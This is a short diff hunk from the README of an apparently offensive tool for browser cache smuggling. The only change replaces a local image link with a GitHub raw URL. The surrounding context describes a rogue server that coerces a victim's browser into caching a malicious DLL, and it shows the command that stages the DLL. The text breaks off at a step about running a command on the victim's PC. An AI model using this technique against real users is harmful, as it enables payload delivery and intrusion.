@@ -23,7 +23,7 @@ Host you rouge Server that coerce browser to Cache The response.
 python3 browsercachesmuggling.py --dll /root/smugglers.dll <malicious_dll>
 ```
 
-![[image.png]]
+![[https://github.com/surya-dev-singh/BrowserCacheSmuggling/blob/main/image.png?raw=true]]
 
 ## Step 4:
 Once Our data is begin cache , we can now run the following command on victim PC like so: 
